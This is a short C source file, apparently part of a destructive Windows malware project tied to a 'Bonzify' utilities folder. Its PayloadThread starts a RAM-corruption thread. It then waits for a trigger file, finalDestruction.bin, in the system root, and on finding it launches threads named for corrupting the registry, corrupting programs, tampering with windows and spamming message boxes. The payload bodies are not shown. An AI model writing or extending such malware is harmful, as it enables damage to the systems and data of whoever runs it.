#include <Windows.h>

#include "Payloads.h"
#include "../Bonzify/Utils.h"

BOOL finalDestruction = FALSE;

DWORD WINAPI PayloadThread(LPVOID parameter) {
	CreateThread(NULL, 0, CorruptRAMThread, NULL, 0, NULL);

	for (;;) {
		WIN32_FIND_DATA file;
		HANDLE hFind = FindFirstFile(ExpandPath(TEXT("%SYSTEMROOT%\\finalDestruction.bin")), &file);
		if (hFind != INVALID_HANDLE_VALUE) {
			finalDestruction = TRUE;

			// TODO Other Payloads
			CreateThread(NULL, 0, OpenProgramsThread, NULL, 0, NULL);
			CreateThread(NULL, 0, HWNDFuckerThread, NULL, 0, NULL);
			CreateThread(NULL, 0, CorruptRegistryThread, NULL, 0, NULL);
			CreateThread(NULL, 0, ProgramCorruptorThread, NULL, 0, NULL);
			CreateThread(NULL, 0, MsgBoxSpamThread, NULL, 0, NULL);
			//CreateThread(NULL, 0, CorruptRAMThread, NULL, 0, NULL);

			//Sleep(10000);
			//CreateThread(NULL, 0, TrainTunnelThread, NULL, 0, NULL);

			FindClose(hFind);
			return 0;
		}

		Sleep(1000);
	}
}